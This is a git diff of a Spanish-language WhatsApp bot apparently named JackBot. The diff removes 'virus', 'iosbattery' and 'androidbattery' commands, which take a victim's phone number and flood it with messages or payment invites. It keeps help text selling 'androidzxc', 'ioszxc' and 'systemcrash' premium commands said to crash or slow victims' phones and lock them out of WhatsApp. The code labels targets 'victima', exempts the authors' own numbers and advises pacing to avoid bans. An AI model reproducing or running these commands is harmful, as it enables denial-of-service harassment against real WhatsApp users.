@@ -487,50 +487,22 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
           sendMessageWithMentions("El usuario ya no es usuario Premium")
         }
         break
-      case 'usuarios': {
-        if (!isCreator) return sendMessageWithMentions(mess.owner);
-
-        const getData = () => {
-          try {
-            const data = require("./database/premium.json");
-            return data;
-          } catch (error) {
-            console.error("ERROR al leer premium.json:", error);
-            return [];
-          }
-        };
-
-        const data = getData();
-        let txt = `*------「 LISTA PREMIUM 」------*\n\n`;
-
-        for (const { id, expired } of data) {
-          txt += `NÚMERO : ${id}\n`;
-          txt += `EXPIRACION : ${expired} Segundos\n`;
-        }
-
-        JackBot.sendMessage(m.chat, {
-          text: txt,
-          mentions: [] // Reemplaza con la variable correcta que deseas mencionar
-        }, {
-          quoted: m
-        });
-        break;
-      }
+      
       //Comando que da informacion sobre los comandos.
       case 'premium': {
         const premiumCommands = `Aqui tienes la información de los comandos Premium 🌟
 ${readmore}
 *𝗖𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺*
 
-❒ ${prefix}𝗮𝗻𝗱𝗿𝗼𝗶𝗱𝘇𝘅𝗰
+❒ `${prefix}𝗮𝗻𝗱𝗿𝗼𝗶𝗱𝘇𝘅𝗰`
 > Este comando ralentiza el dispositivo Android de la persona afectada, haciendo que el sistema operativo comience a funcionar más lentamente y con errores graduales. Como resultado, WhatsApp también se verá afectado, negando el acceso a la aplicación.
 
 
-❒ ${prefix}𝗶𝗼𝘀𝘇𝘅𝗰
+❒ `${prefix}𝗶𝗼𝘀𝘇𝘅𝗰`
 > Ralentiza el dispositivo iOS afectado, causando fallos graduales en el sistema operativo y  en el acceso a WhatsApp.
 
 
-❒ ${prefix}𝘀𝘆𝘀𝘁𝗲𝗺𝗰𝗿𝗮𝘀𝗵
+❒ `${prefix}𝘀𝘆𝘀𝘁𝗲𝗺𝗰𝗿𝗮𝘀𝗵`
 > Genera un crash en el dispositivo Android afectado (versiones 10 o inferiores), mostrando un mensaje de error del sistema y afectando el acceso a WhatsApp.
 
 La persona afectada puede recuperar el acceso eliminando la aplicación WhatsApp o teniendo su cuenta vinculada en WhatsApp Web.
@@ -683,63 +655,6 @@ La persona afectada puede recuperar el acceso eliminando la aplicación WhatsApp
       }
         break;
         
-      /*case "iosbattery": {
-        if (!isPremium) return sendMessageWithMentions(mess.prem)
-        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
-        let number = text.split(',')[0];
-        let amount = text.split(',')[1] * 5;
-        if (!number || !amount) {
-          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
-        }
-        if (isNaN(parseInt(amount))) {
-          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
-        }
-        let cleanedNumber = number.replace(/[^0-9]/g, '');
-        let encodedAmount = '' + encodeURI(amount);
-        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
-          // No hacer nada, salir de la función
-          return;
-        }
-        if (contactInfo.length == 0) {
-          return sendMessageWithMentions("El número no está registrado en WhatsApp");
-        }
-        sendMessageWithMentions("virus en process..");
-        await sleep(2000); // Adjusted sleep time for clarity
-        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
-        await sleep(2500); // Adjusted sleep time for clarity
-        sendMessageWithMentions(
-          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
-          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
-          [whatsappNumber]
-        );
-      }
-        break;*/
-
-      case "virus":
-        {
-          if (!isCreator) {
-            return sendMessageWithMentions("*HEY! Usted no puedes usar esta funcion*");
-          }
-          if (!text) {
-            return sendMessageWithMentions("Ejemplo de uso: ${ prefix + command} 5")
-          }
-          if (isNaN(parseInt(text))) {
-            return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
-          }
-          let cleanedNumber = text.replace(/\D+/g, ''); // Remove non-numeric characters
-          if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
-            return; // No hacer nada, salir de la función
-          }
-          let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-          sendMessageWithMentions("virus en process..");
-          await sleep(1500); // Adjusted sleep time for clarity
-          sendVariousMessages(from, encodedValue);
-          await sleep(2500); // Adjusted sleep time for clarity
-          sendReaction('✅');
-        }
-        break;
 
       /*case "gp":
         {
@@ -798,40 +713,6 @@ La persona afectada puede recuperar el acceso eliminando la aplicación WhatsApp
         );
       }
         break;
-        
-      /*case "androidbattery": {
-        if (!isPremium) return sendMessageWithMentions(mess.prem)
-        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
-        let number = text.split(',')[0];
-        let amount = text.split(',')[1] * 5;
-        if (!number || !amount) {
-          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
-        }
-        if (isNaN(parseInt(amount))) {
-          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
-        }
-        let cleanedNumber = number.replace(/[^0-9]/g, '');
-        let encodedAmount = '' + encodeURI(amount);
-        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
-          // No hacer nada, salir de la función
-          return;
-        }
-        if (contactInfo.length == 0) {
-          return sendMessageWithMentions("El número no está registrado en WhatsApp");
-        }
-        sendMessageWithMentions("virus en process..");
-        await sleep(2000); // Adjusted sleep time for clarity
-        sendRepeatedMessages2(whatsappNumber, encodedAmount);
-        await sleep(2500); // Adjusted sleep time for clarity
-        sendMessageWithMentions(
-          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
-          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
-          [whatsappNumber]
-        );
-      }
-        break;*/
 
       case 'pin': case 'pintesert': {
         if (!text) return sendMessageWithMentions(`Ingresa nombre de la imagen\n\nEjemplo:\n\n${prefix + command} Gatito`)
@@ -855,9 +736,9 @@ La persona afectada puede recuperar el acceso eliminando la aplicación WhatsApp
 ${readmore}
 
 ╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ᴘʀᴇᴍɪᴜᴍꜱ*
-> ${prefix}androidzxc - envía virus
-> ${prefix}systemcrash - envía virus
-> ${prefix}ioszxc - envía virus
+> ${prefix}androidzxc
+> ${prefix}systemcrash
+> ${prefix}ioszxc
 
 ╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ɢʀᴀᴛɪꜱ*
 > ${prefix}s - crea sticker al instante
